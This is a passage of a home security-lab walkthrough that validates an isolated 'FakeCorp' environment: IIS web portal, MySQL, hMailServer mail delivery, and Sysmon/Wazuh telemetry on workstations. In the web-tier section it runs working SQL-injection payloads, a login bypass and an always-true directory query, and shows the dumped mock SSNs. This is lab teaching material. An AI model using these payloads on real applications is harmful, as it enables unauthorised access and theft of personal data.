+<pre><code class="language-plaintext">No successful directory listing was retained in this run.
+</code></pre>
+<p>The original one-line version removed the temporary drive before a later prompt tried to enumerate it, so its captured output did not prove file access. The corrected <code>try</code>/<code>finally</code> version above performs the listing while the drive exists and always removes the mapping afterward. I need to rerun it and retain the successful listing before treating this check as evidence.</p>
+<h3>Web and database tier</h3>
+<p>I start the FakeCorp portal review by checking its physical path and binding port:</p>
+<pre><code class="language-powershell"># Select the FakeCorp IIS site and report its state, disk path, and bindings.
+Get-Website |
+    Where-Object Name -eq &#39;FakeCorp&#39; |
+    Select-Object Name, State, PhysicalPath, @{N=&#39;Binding&#39;;E={$_.Bindings.Collection.bindingInformation}}
+</code></pre>
+<pre><code class="language-plaintext">name     state   physicalPath        Binding
+----     -----   ------------        -------
+FakeCorp Started C:\inetpub\fakecorp *:8080:
+</code></pre>
+<p>Is it really up?</p>
+<pre><code class="language-powershell"># Request the FakeCorp home page locally and print its HTTP status code.
+(Invoke-WebRequest &#39;http://localhost:8080/&#39; -UseBasicParsing).StatusCode
+</code></pre>
+<pre><code class="language-plaintext">200
+</code></pre>
+<p>Next, I discover the form fields by extracting the <code>&lt;input&gt;</code> elements from the page source:</p>
+<pre><code class="language-powershell"># Fetch the FakeCorp login page.
+$response = Invoke-WebRequest &#39;http://localhost:8080/&#39; -UseBasicParsing
+# List the names and types of the HTML form inputs found in the response.
+$response.InputFields | Select-Object Name, Type
+</code></pre>
+<pre><code class="language-plaintext">name     type
+----     ----
+email    text
+password password
+</code></pre>
+<p>The login page is <code>index.php</code>. It posts to itself, and its query is <code>SELECT id, first_name, last_name FROM employees WHERE email=&#39;$email&#39; AND password=&#39;$password&#39; LIMIT 1</code> with the <code>email</code> field concatenated straight in. The bypass payload closes the quote and comments out the password test:</p>
+<pre><code class="language-powershell"># Submit the documented lab-only SQL-injection string and retain the authenticated session.
+$session = Invoke-WebRequest &#39;http://localhost:8080/&#39; -Method POST -Body @{
+    email = &quot;admin@fakecorp.local&#39; -- &quot;
+    password = &#39;x&#39;
+} -UseBasicParsing -SessionVariable WebSession
+# State whether the expected authenticated marker appeared in the response.
+if ($session.Content -match &#39;Signed in as&#39;) {
+    &#39;BYPASS OK - authenticated as admin with no password&#39;
+}
+else {
+    &#39;Login page returned - injection did not take&#39;
+}
+</code></pre>
+<p>The PowerShell payload above turns the SQL query from this:</p>
+<pre><code class="language-sql">-- Select the identity fields required by the login handler.
+SELECT id, first_name, last_name FROM employees
+-- Require both submitted values and return at most one account.
+WHERE email=&#39;$email&#39; AND password=&#39;$password&#39; LIMIT 1
+</code></pre>
+<p>To this:</p>
+<pre><code class="language-sql">-- Select the same identity fields after interpolation.
+SELECT id, first_name, last_name FROM employees
+-- The injected comment marker removes the password predicate from execution.
+WHERE email=&#39;admin@fakecorp.local&#39; -- &#39; AND password=&#39;x&#39; LIMIT 1
+</code></pre>
+<ul>
+<li>The single quote closes the email string early.</li>
+<li>-- starts a SQL comment, so everything after it (the password check) is ignored.</li>
+<li>Result: the query only checks whether a user with that email exists. The password is never verified.</li>
+</ul>
+<pre><code class="language-plaintext">BYPASS OK - authenticated as admin with no password
+</code></pre>
+<p>The next controlled test uses the directory search in <code>directory.php</code>, whose <code>q</code> parameter is inserted directly into <code>... WHERE last_name LIKE &#39;%$q%&#39; OR department LIKE &#39;%$q%&#39;</code>. I reuse the authenticated session and submit an always-true condition:</p>
+<pre><code class="language-powershell"># Reuse the authenticated session and submit the documented always-true directory query.
+$dump = Invoke-WebRequest &quot;http://localhost:8080/directory.php?q=&#39; OR &#39;1&#39;=&#39;1&#39; --+&quot; -UseBasicParsing -WebSession $WebSession
+# Extract unique mock SSN-shaped values from the returned HTML.
+([regex]::Matches($dump.Content, &#39;\d{3}-\d{2}-\d{4}&#39;)).Value |
+    Select-Object -Unique
+</code></pre>
+<pre><code class="language-plaintext">481-22-9080
+502-88-1147
+466-15-3341
+336-71-4402
+419-55-6621
+305-27-6618
+390-51-7723
+288-40-7715
+145-92-3308
+174-83-9902
+372-18-5529
+260-47-8813
+408-33-2190
+331-60-4472
+517-29-6084
+223-74-1156
+000-00-0001
+</code></pre>
+<p>The regex pattern <code>\d{3}-\d{2}-\d{4}</code> extracts the mock social security numbers.</p>
+<p>To compare, this is the normal query the application expects:</p>
+<pre><code class="language-sql">-- Search the employee table.
+SELECT ...
+FROM employees
+-- Match the submitted term against either supported column.
+WHERE name LIKE &#39;%$q%&#39;
+   OR department LIKE &#39;%$q%&#39;
+</code></pre>
+<p>The payload query instead sends:</p>
+<pre><code class="language-sql">-- Search the same employee table after direct payload interpolation.
+SELECT ...
+FROM employees
+-- Make the first predicate true and comment out the rest of the statement.
+WHERE name LIKE &#39;%&#39; OR &#39;1&#39;=&#39;1&#39; --+%&#39;
+   OR department LIKE &#39;%&#39; OR &#39;1&#39;=&#39;1&#39; --+%&#39;
+</code></pre>
+<p>After the database applies the comment marker, the executed condition effectively becomes:</p>
+<pre><code class="language-sql">-- This is the effective statement after the database applies the comment marker.
+SELECT ...
+FROM employees
+-- The always-true expression causes every row to match.
+WHERE name LIKE &#39;%&#39; OR &#39;1&#39;=&#39;1&#39;
+</code></pre>
+<p>I now run a query through the least-privilege <code>webapp</code> account. That account can read only the FakeCorp database, so it cannot change data or access other databases. This limits the impact of a successful injection:</p>
+<pre><code class="language-powershell"># Request the least-privilege database credential without placing the password in the script.
+$dbCredential = Get-Credential -UserName webapp -Message &#39;Retrieve the FakeCorp webapp credential securely&#39;
+# Expose the password only to the MySQL client process through its supported environment variable.
+$env:MYSQL_PWD = $dbCredential.GetNetworkCredential().Password
+try {
+    # Read five sample rows using the web application&#39;s restricted database account.
+    &amp; &#39;C:\Program Files\MySQL\MySQL Server 9.7\bin\mysql.exe&#39; -u webapp -h 127.0.0.1 -N -e &quot;SELECT email, ssn, salary FROM fakecorp.employees LIMIT 5&quot;
+}
+finally {
+    # Remove the temporary password value from the process environment.
+    Remove-Item Env:MYSQL_PWD -ErrorAction SilentlyContinue
+}
+</code></pre>
+<pre><code class="language-plaintext">PowerShell credential request
+Retrieve the FakeCorp webapp credential securely
+Password for user webapp: ************
+
++------------------------+-------------+--------+
+| pvance@fakecorp.local  | 481-22-9080 | 385000 |
+| mbell@fakecorp.local   | 502-88-1147 | 295000 |
+| wfoster@fakecorp.local | 466-15-3341 | 268000 |
+| dokafor@fakecorp.local | 336-71-4402 | 172000 |
+| rcho@fakecorp.local    | 419-55-6621 | 118000 |
++------------------------+-------------+--------+
+</code></pre>
+<p>MySQL (3306) and its X Plugin (33060) listen only on <code>127.0.0.1</code>, not the lab address, so the database is reachable by the web app on the same box but not from the network:</p>
+<pre><code class="language-powershell"># Confirm that MySQL&#39;s classic and X Protocol ports are listening.
+Get-NetTCPConnection -State Listen -LocalPort 3306, 33060 |
+    Select-Object LocalAddress, LocalPort
+</code></pre>
+<pre><code class="language-plaintext">LocalAddress LocalPort
+------------ ---------
+127.0.0.1        33060
+127.0.0.1         3306
+</code></pre>
+<h3>Mail tier</h3>
+<p>The next check confirms that hMailServer&#39;s SMTP, POP3, and IMAP listeners are bound:</p>
+<pre><code class="language-powershell"># Confirm the SMTP, POP3, IMAP, and submission listeners, then sort them by port.
+Get-NetTCPConnection -State Listen -LocalPort 25, 110, 143, 587 |
+    Select-Object LocalAddress, LocalPort |
+    Sort-Object LocalPort
+</code></pre>
+<pre><code class="language-plaintext">LocalAddress LocalPort
+------------ ---------
+0.0.0.0             25
+0.0.0.0            110
+0.0.0.0            143
+0.0.0.0            587
+</code></pre>
+<p><em>Why does it show 0.0.0.0?</em></p>
+<p>That includes:</p>
+<ul>
+<li>The internal IP (e.g. 10.10.10.12)</li>
+<li>The loopback address (127.0.0.1)</li>
+<li>Any other network adapters the server has</li>
+</ul>
+<p>Confirm configuration through hMailServer&#39;s own API:</p>
+<pre><code class="language-powershell"># Request the hMailServer administrator credential interactively.
+$hmCredential = Get-Credential -UserName Administrator -Message &#39;Retrieve the hMailServer administrator credential securely&#39;
+# Connect to hMailServer&#39;s local COM administration interface.
+$hMail = New-Object -ComObject hMailServer.Application
+# Authenticate the COM session without writing the password to output.
+$hMail.Authenticate($hmCredential.UserName, $hmCredential.GetNetworkCredential().Password) | Out-Null
+# Read the configured FakeCorp mail domain.
+$domain = $hMail.Domains.ItemByName(&#39;fakecorp.local&#39;)
+# Print the domain state and mailbox count.
+&quot;domain=$($domain.Name) active=$($domain.Active) mailboxes=$($domain.Accounts.Count)&quot;
+</code></pre>
+<pre><code class="language-plaintext">PowerShell credential request
+Retrieve the hMailServer administrator credential securely
+Password for user Administrator: **************
+
+domain=fakecorp.local active=True mailboxes=17
+</code></pre>
+<p>The following Python script sends a uniquely tagged message through hMailServer and verifies that the exact message reached the server-side mail store:</p>
+<p>This version does not need or log a mail credential. It submits a message for the existing local mailbox <code>pvance@fakecorp.local</code>, gives the message a unique run ID, then uses the already-tested SSH administration route to locate that exact <code>.eml</code> in hMailServer&#39;s data store and hash it. It also confirms that the POP3 listener answers.</p>
+<pre><code class="language-python">&quot;&quot;&quot;Send and verify one run-scoped message through the isolated FakeCorp mail lab.&quot;&quot;&quot;
+
+# Allow modern type annotations while keeping runtime behavior explicit.
+from __future__ import annotations
+
+# Encode the remote PowerShell payload for reliable SSH transport.
+import base64
+# Create timezone-aware timestamps for correlation and evidence.
+import datetime as dt
+# Build the SMTP message with the standard email API.
+from email.message import EmailMessage
+# Generate RFC-compliant Date and Message-ID headers.
+import email.utils
+# Parse the structured result returned by SRV01.
+import json
+# Manage evidence paths without manual separator handling.
+import pathlib
+# Check the POP3 listener without transmitting a mailbox credential.
+import poplib
+# Submit the lab message over SMTP.
+import smtplib
+# Run the SSH client used for server-side verification.
+import subprocess
+# Bound the delivery polling loop with a monotonic clock.
+import time
+# Add a collision-resistant suffix to each run identifier.
+import uuid
+
+# Address the mail services on SRV01 directly inside the isolated lab.
+MAIL_HOST = &quot;10.10.10.12&quot;
+# Use hMailServer&#39;s plaintext SMTP listener for message submission.
+SMTP_PORT = 25
+# Use hMailServer&#39;s POP3 listener for a credential-free banner check.
+POP3_PORT = 110
+# Identify the controlled sender used by this walkthrough.
+SENDER = &quot;walkthrough@corp.local&quot;
+# Deliver to an existing local FakeCorp mailbox.
+RECIPIENT = &quot;pvance@fakecorp.local&quot;
+# Reuse the established SSH administration route to SRV01.
+REMOTE_TARGET = r&quot;CORP\Administrator@10.10.10.12&quot;
+# Search only hMailServer&#39;s FakeCorp message store on SRV01.
+REMOTE_DATA_ROOT = r&quot;C:\Program Files (x86)\hMailServer\Data\fakecorp.local&quot;
+# Keep the validation record on persistent external storage.
+LOG_DIRECTORY = pathlib.Path(r&quot;E:\01 Scripts\02 Health Checks\Windows\Mail-Demo-Results&quot;)
+# Fail if the accepted message does not reach disk within this interval.
+DELIVERY_TIMEOUT_SECONDS = 30
+
+
+def verify_pop3_listener() -&gt; str:
+    &quot;&quot;&quot;Verify that hMailServer answers on POP3 without sending a credential.&quot;&quot;&quot;
+    # Open a short-lived POP3 connection to collect the server greeting.
+    pop = poplib.POP3(MAIL_HOST, POP3_PORT, timeout=10)
+    try:
+        # Decode the greeting safely even if it contains a non-ASCII byte.
+        return pop.getwelcome().decode(&quot;ascii&quot;, errors=&quot;replace&quot;)
+    finally:
+        # Close the POP3 session even when banner decoding fails.
+        pop.quit()
+
+
+def find_delivered_message(run_id: str, started_utc: dt.datetime) -&gt; dict | None:
+    &quot;&quot;&quot;Ask SRV01 to locate the exact run-tagged message in its local mail store.&quot;&quot;&quot;
+    # Convert the search floor to an ISO UTC value PowerShell can parse.
+    after = started_utc.isoformat().replace(&quot;+00:00&quot;, &quot;Z&quot;)
+    # Build a read-only PowerShell query that returns one matching file as JSON.
+    powershell = rf&quot;&quot;&quot;
+$ErrorActionPreference = &#39;Stop&#39;
+$after = [DateTime]::Parse(&#39;{after}&#39;).ToUniversalTime()
+$match = Get-ChildItem -LiteralPath &#39;{REMOTE_DATA_ROOT}&#39; -Recurse -File |
+    Where-Object {{ $_.LastWriteTimeUtc -ge $after }} |
+    Where-Object {{ Select-String -LiteralPath $_.FullName -SimpleMatch -Quiet -Pattern &#39;{run_id}&#39; }} |
+    Sort-Object LastWriteTimeUtc -Descending |
+    Select-Object -First 1
+if ($null -eq $match) {{ exit 3 }}
+$hash = Get-FileHash -LiteralPath $match.FullName -Algorithm SHA256
+[pscustomobject]@{{
+    FullName = $match.FullName
+    Length = $match.Length
+    LastWriteTimeUtc = $match.LastWriteTimeUtc.ToString(&#39;o&#39;)
+    SHA256 = $hash.Hash
+}} | ConvertTo-Json -Compress
+&quot;&quot;&quot;
+    # Encode the Windows PowerShell command as UTF-16LE, as -EncodedCommand expects.
+    encoded = base64.b64encode(powershell.encode(&quot;utf-16le&quot;)).decode(&quot;ascii&quot;)
+    # Construct an SSH command that rejects prompts and unknown host-key changes.
+    command = [
+        &quot;ssh.exe&quot;,
+        &quot;-o&quot;, &quot;BatchMode=yes&quot;,
+        &quot;-o&quot;, &quot;StrictHostKeyChecking=yes&quot;,
+        &quot;-o&quot;, &quot;ConnectTimeout=8&quot;,
+        REMOTE_TARGET,
+        f&quot;powershell.exe -NoProfile -NonInteractive -EncodedCommand {encoded}&quot;,
+    ]
+    # Execute the remote read-only lookup with a client-side timeout.
+    result = subprocess.run(command, capture_output=True, text=True, timeout=15, check=False)
+    # Treat exit code 3 as a normal polling miss rather than a hard failure.
+    if result.returncode == 3:
+        return None
+    # Surface any other SSH or PowerShell failure with its diagnostic text.
+    if result.returncode != 0:
+        detail = result.stderr.strip() or result.stdout.strip()
+        raise RuntimeError(f&quot;SRV01 delivery check failed: {detail}&quot;)
+    # Ignore SSH noise and retain the JSON object emitted by PowerShell.
+    json_lines = [line for line in result.stdout.splitlines() if line.startswith(&quot;{&quot;)]
+    # Reject a successful exit that did not return the promised structure.
+    if not json_lines:
+        raise RuntimeError(&quot;SRV01 delivery check returned no JSON result.&quot;)
+    # Return the newest matching file&#39;s metadata to the caller.
+    return json.loads(json_lines[-1])
+
+
+def run_mail_demo() -&gt; pathlib.Path:
+    &quot;&quot;&quot;Submit one message and prove that hMailServer stored that exact message.&quot;&quot;&quot;
+    # Start the file search slightly early to tolerate timestamp granularity.
+    started_utc = dt.datetime.now(dt.timezone.utc) - dt.timedelta(seconds=2)
+    # Generate the correlation value embedded in the message and evidence filename.
+    run_id = f&quot;MAIL-{dt.datetime.now(dt.timezone.utc):%Y%m%dT%H%M%SZ}-{uuid.uuid4().hex[:8]}&quot;
+    # Make the run identifier visible in the message subject.
+    subject = f&quot;[LAB] Mail pipeline validation {run_id}&quot;
+
+    # Create a standards-compliant message object.
+    message = EmailMessage()
+    # Populate the envelope-visible and message-visible addressing fields.
+    message[&quot;From&quot;] = SENDER
+    message[&quot;To&quot;] = RECIPIENT
+    # Add correlation and time headers for later evidence matching.
+    message[&quot;Subject&quot;] = subject
+    message[&quot;Date&quot;] = email.utils.format_datetime(dt.datetime.now(dt.timezone.utc))
+    message[&quot;Message-ID&quot;] = email.utils.make_msgid(domain=&quot;corp.local&quot;)
+    message[&quot;X-Lab-Run-ID&quot;] = run_id
+    # Add a harmless body that states the test&#39;s purpose.
+    message.set_content(
+        &quot;This is an authorized FakeCorp lab message used to validate the &quot;
+        &quot;SMTP delivery path.\n&quot;
+    )
+
+    # Submit the message without authenticating to the isolated SMTP listener.
+    with smtplib.SMTP(MAIL_HOST, SMTP_PORT, timeout=10) as smtp:
+        # Negotiate the server&#39;s ESMTP or SMTP capabilities.
+        smtp.ehlo_or_helo_if_needed()
+        # Record any recipients that the server rejects.
+        refused = smtp.send_message(message)
+        # Fail when hMailServer refuses one or more recipients.
+        if refused:
+            raise RuntimeError(f&quot;SMTP refused recipient(s): {sorted(refused)}&quot;)
+
+    # Poll SRV01 until the exact run-tagged message appears or the deadline expires.
+    delivered = None
+    deadline = time.monotonic() + DELIVERY_TIMEOUT_SECONDS
+    while time.monotonic() &lt; deadline:
+        delivered = find_delivered_message(run_id, started_utc)
+        # Stop polling as soon as the server returns the matching file metadata.
+        if delivered is not None:
+            break
+        # Avoid repeatedly querying SRV01 without a delay.
+        time.sleep(2)
+    # Distinguish SMTP acceptance from proved server-side delivery.
+    if delivered is None:
+        raise TimeoutError(
+            f&quot;SMTP accepted {run_id}, but the message did not appear in the &quot;
+            f&quot;hMailServer data store within {DELIVERY_TIMEOUT_SECONDS} seconds.&quot;
+        )
+
+    # Verify the independent POP3 listener and prepare the evidence destination.
+    pop3_banner = verify_pop3_listener()
+    LOG_DIRECTORY.mkdir(parents=True, exist_ok=True)
+    # Tie the evidence filename to the same unique message identifier.
+    log_path = LOG_DIRECTORY / f&quot;Mail-Demo-{run_id}.txt&quot;
+    # Record endpoints, delivery metadata, and the server-side file hash.
+    log_lines = [
+        &quot;FakeCorp mail pipeline validation: PASS&quot;,
+        f&quot;Run ID: {run_id}&quot;,
+        f&quot;UTC completed: {dt.datetime.now(dt.timezone.utc).isoformat()}&quot;,
+        f&quot;SMTP endpoint: {MAIL_HOST}:{SMTP_PORT}&quot;,
+        f&quot;POP3 endpoint: {MAIL_HOST}:{POP3_PORT}&quot;,
+        f&quot;POP3 banner: {pop3_banner}&quot;,
+        f&quot;Sender: {SENDER}&quot;,
+        f&quot;Recipient: {RECIPIENT}&quot;,
+        f&quot;Delivered bytes: {delivered[&#39;Length&#39;]}&quot;,
+        f&quot;Delivered UTC: {delivered[&#39;LastWriteTimeUtc&#39;]}&quot;,
+        f&quot;Delivered file: {delivered[&#39;FullName&#39;]}&quot;,
+        f&quot;Delivered SHA-256: {delivered[&#39;SHA256&#39;]}&quot;,
+        &quot;Credentials transmitted or logged: no&quot;,
+    ]
+    # Write one durable UTF-8 record and return its path.
+    log_path.write_text(&quot;\n&quot;.join(log_lines) + &quot;\n&quot;, encoding=&quot;utf-8&quot;)
+    return log_path
+
+
+def main() -&gt; int:
+    &quot;&quot;&quot;Run the check, print the evidence record, and return a process exit code.&quot;&quot;&quot;
+    try:
+        # Execute the end-to-end mail validation.
+        log_path = run_mail_demo()
+    except (OSError, poplib.error_proto, smtplib.SMTPException, RuntimeError) as exc:
+        # Print a concise failure record suitable for terminal evidence.
+        print(f&quot;FakeCorp mail pipeline validation: FAIL\n{type(exc).__name__}: {exc}&quot;)
+        return 1
+
+    # Echo the durable evidence record and its path for the operator.
+    print(log_path.read_text(encoding=&quot;utf-8&quot;), end=&quot;&quot;)
+    print(f&quot;Evidence log: {log_path}&quot;)
+    return 0
+
+
+# Convert the main function&#39;s return value into the process exit status.
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+</code></pre>
+<pre><code class="language-plaintext">FakeCorp mail pipeline validation: PASS
+Run ID: MAIL-20260909T070434Z-74d80099
+UTC completed: 2026-09-09T07:04:38.554001+00:00
+SMTP endpoint: 10.10.10.12:25
+POP3 endpoint: 10.10.10.12:110
+POP3 banner: +OK POP3
+Sender: walkthrough@corp.local
+Recipient: pvance@fakecorp.local
+Delivered bytes: 621
+Delivered UTC: 2026-09-09T07:04:34.6840432Z
+Delivered file: C:\Program Files (x86)\hMailServer\Data\fakecorp.local\pvance\55\{550273C3-4AFF-4F49-9E72-6EB5AFA62C44}.eml
+Delivered SHA-256: A7F8282A4CE6886E95A836E0CA506FBD320ED0BFB969AD8C99D60E25AC79D959
+Credentials transmitted or logged: no
+Evidence log: E:\01 Scripts\02 Health Checks\Windows\Mail-Demo-Results\Mail-Demo-MAIL-20260909T070434Z-74d80099.txt
+</code></pre>
+<h3>Endpoint telemetry</h3>
+<p>Finally, I check the same defensive services that run on DC01:</p>
+<pre><code class="language-powershell"># Confirm that Sysmon, Wazuh, and Velociraptor are running on SRV01.
+Get-Service -Name @(&#39;Sysmon64&#39;, &#39;WazuhSvc&#39;, &#39;Velociraptor&#39;) |
+    Select-Object Name, Status
+</code></pre>
+<pre><code class="language-plaintext">Name          Status
+----          ------
+Sysmon64     Running
+Velociraptor Running
+WazuhSvc     Running
+</code></pre>
+<hr>
+<p>The shared services are available and observable. I now move to the two Windows workstations to verify the endpoint telemetry that feeds the detection stack.</p>
+<h2>WS01</h2>
+<h3>Host identity and Sysmon</h3>
+<p>The physical hosts, domain controller, and member server are accounted for. WS01 is the first Windows 11 endpoint. It serves primarily as a reference endpoint and negative control; if an experiment changes WS02 unexpectedly, I can compare it with WS01.</p>
+<pre><code class="language-powershell"># Print the workstation hostname.
+hostname
+
+# Confirm the workstation&#39;s domain membership and member-workstation role.
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name, Domain, DomainRole
+</code></pre>
+<pre><code class="language-plaintext">WS01
+
+
+Name Domain     DomainRole
+---- ------     ----------
+WS01 corp.local          1
+</code></pre>
+<pre><code class="language-powershell"># Confirm that Sysmon is running and configured for automatic startup.
+Get-Service -Name Sysmon64 |
+    Select-Object Name, Status, StartType
+
+# Print the active Sysmon configuration.
+&amp; &#39;C:\Windows\Sysmon64.exe&#39; -c
+</code></pre>
+<pre><code class="language-plaintext">Name      Status StartType
+----      ------ ---------
+Sysmon64 Running Automatic
+
+System Monitor v15.20 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2026 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Current configuration:
+ - Service name:                  Sysmon64
+ - Driver name:                   SysmonDrv
+ - Config file:                   C:\WINDOWS\SystemTemp\sysmonconfig-export.xml
+ - Config hash:                   SHA256=055FEBC600E6D7448CDF3812307275912927A62B1F94D0D933B64B294BC87162
+
+ - HashingAlgorithms:             MD5,SHA256,IMPHASH
+ - Network connection:            enabled
+ - Archive Directory:             -
+ - Image loading:                 disabled
+ - CRL checking:                  enabled
+ - DNS lookup:                    enabled
+</code></pre>
+<p>Sysmon supplies process creation, network connection, DNS, and other endpoint evidence used by Wazuh.</p>
+<p>To confirm that Sysmon is recording events, I generate a simple <code>ping</code> process and retrieve the latest process-creation event:</p>
+<pre><code class="language-powershell"># Launch one short-lived process to create fresh Sysmon process telemetry.
+&amp; ping.exe -n 1 10.10.10.11 | Out-Null
+
+# Retrieve the newest Sysmon process-creation event and show its timestamp and image path.
+$ProcessEventFilter = @{LogName=&#39;Microsoft-Windows-Sysmon/Operational&#39;; Id=1}
+Get-WinEvent -FilterHashtable $ProcessEventFilter -MaxEvents 1 |
+    Select-Object TimeCreated, @{N=&#39;Image&#39;;E={$_.Properties[4].Value}}
+</code></pre>
+<pre><code class="language-plaintext">TimeCreated         Image
+-----------         -----
+9/8/2026 1:50:21 PM C:\Windows\System32\PING.EXE
+</code></pre>
+<p>Next, I retrieve the network-connection records:</p>
+<pre><code class="language-powershell"># Retrieve the five newest Sysmon network-connection events with their complete messages.
+$NetworkEventFilter = @{LogName=&#39;Microsoft-Windows-Sysmon/Operational&#39;; Id=3}
+Get-WinEvent -FilterHashtable $NetworkEventFilter -MaxEvents 5 |
+    Select-Object TimeCreated, Message |
+    Format-List
+</code></pre>
+<pre><code class="language-plaintext">TimeCreated : 9/8/2026 10:22:05 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:22:03.176
+              ProcessGuid: {74a4dd39-cd2f-6a9e-4600-000000003000}
+              ProcessId: 3276
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 63386
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.21
+              DestinationHostname: WS01.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:21:33 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:21:31.136
+              ProcessGuid: {74a4dd39-cd2f-6a9e-4600-000000003000}
+              ProcessId: 3276
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 55163
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.21
+              DestinationHostname: WS01.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:18:03 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:18:01.469
+              ProcessGuid: {74a4dd39-cd2f-6a9e-4600-000000003000}
+              ProcessId: 3276
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 59458
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.21
+              DestinationHostname: WS01.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 10:17:06 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 17:17:03.663
+              ProcessGuid: {74a4dd39-cd2f-6a9e-4600-000000003000}
+              ProcessId: 3276
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.10
+              SourceHostname: CORP
+              SourcePort: 52174
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.21
+              DestinationHostname: WS01.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+
+TimeCreated : 9/8/2026 8:56:16 AM
+Message     : Network connection detected:
+              RuleName: SSH
+              UtcTime: 2026-09-08 15:56:15.627
+              ProcessGuid: {74a4dd39-cd2f-6a9e-4600-000000003000}
+              ProcessId: 3276
+              Image: C:\Windows\System32\OpenSSH\sshd.exe
+              User: NT AUTHORITY\SYSTEM
+              Protocol: tcp
+              Initiated: false
+              SourceIsIpv6: false
+              SourceIp: 10.10.10.30
+              SourceHostname: -
+              SourcePort: 53546
+              SourcePortName: -
+              DestinationIsIpv6: false
+              DestinationIp: 10.10.10.21
+              DestinationHostname: WS01.corp.local
+              DestinationPort: 22
+              DestinationPortName: ssh
+</code></pre>
+<h3>Network configuration and agents</h3>
+<p>Confirm that WS01 uses DC01 as its primary DNS server:</p>
+<pre><code class="language-powershell"># Show the IPv4 DNS servers assigned to each network interface.
+Get-DnsClientServerAddress -AddressFamily &#39;IPv4&#39; |
+    Select-Object InterfaceAlias, ServerAddresses
+</code></pre>
+<pre><code class="language-plaintext">InterfaceAlias              ServerAddresses
+--------------              ---------------
+Ethernet1                   {10.10.10.11}
+Loopback Pseudo-Interface 1 {}
+</code></pre>
+<p>For the final WS01 check, Wazuh carries endpoint events to SIEM01, while Velociraptor provides an independent host-collection path:</p>
+<pre><code class="language-powershell"># Confirm that the Wazuh and Velociraptor endpoint agents are running automatically.
+Get-Service -Name @(&#39;WazuhSvc&#39;, &#39;Velociraptor&#39;) |
+    Select-Object Name, Status, StartType
+</code></pre>
+<pre><code class="language-plaintext">Name          Status StartType
+----          ------ ---------
+Velociraptor Running Automatic
+WazuhSvc     Running Automatic
+</code></pre>
+<hr>
+<h2>WS02</h2>
+<h3>Host identity and Sysmon</h3>
+<p>WS02 is where I run most controlled Windows 11 attacks. It serves as the detonation and lateral-movement endpoint.</p>
+<pre><code class="language-powershell"># Print the workstation hostname.
+hostname
+
+# Confirm the workstation&#39;s domain membership and member-workstation role.
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name, Domain, DomainRole
+</code></pre>
+<pre><code class="language-plaintext">WS02
+
+
+Name Domain     DomainRole
+---- ------     ----------
+WS02 corp.local          1
+</code></pre>
+<pre><code class="language-powershell"># Confirm that Sysmon is running and configured for automatic startup.
+Get-Service -Name Sysmon64 |
+    Select-Object Name, Status, StartType
+
+# Print the active Sysmon configuration.
+&amp; &#39;C:\Windows\Sysmon64.exe&#39; -c
+</code></pre>
+<pre><code class="language-plaintext">Name      Status StartType
+----      ------ ---------
+Sysmon64 Running Automatic
+
+
+System Monitor v15.20 - System activity monitor
+By Mark Russinovich and Thomas Garnier
+Copyright (C) 2014-2026 Microsoft Corporation
+Using libxml2. libxml2 is Copyright (C) 1998-2012 Daniel Veillard. All Rights Reserved.
+Sysinternals - www.sysinternals.com
+
+Current configuration:
+ - Service name:                  Sysmon64
+ - Driver name:                   SysmonDrv
+ - Config file:                   C:\ProgramData\smbase.xml
+ - Config hash:                   SHA256=055FEBC600E6D7448CDF3812307275912927A62B1F94D0D933B64B294BC87162
+
+ - HashingAlgorithms:             MD5,SHA256,IMPHASH
+ - Network connection:            enabled
+ - Archive Directory:             -
+ - Image loading:                 disabled
+ - CRL checking:                  enabled
+ - DNS lookup:                    enabled
+</code></pre>
+<p>As on WS01, I generate a simple process and retrieve the newest Sysmon process-creation event:</p>
+<pre><code class="language-powershell"># Launch one short-lived process to create fresh Sysmon process telemetry.
+&amp; ping.exe -n 1 10.10.10.11 | Out-Null
+
+# Retrieve the newest Sysmon process-creation event and show its timestamp and image path.
+$ProcessEventFilter = @{LogName=&#39;Microsoft-Windows-Sysmon/Operational&#39;; Id=1}
+Get-WinEvent -FilterHashtable $ProcessEventFilter -MaxEvents 1 |
+    Select-Object TimeCreated, @{N=&#39;Image&#39;;E={$_.Properties[4].Value}}
+</code></pre>
+<pre><code class="language-plaintext">TimeCreated         Image
+-----------         -----
+9/8/2026 1:56:36 PM C:\Windows\System32\PING.EXE
+</code></pre>
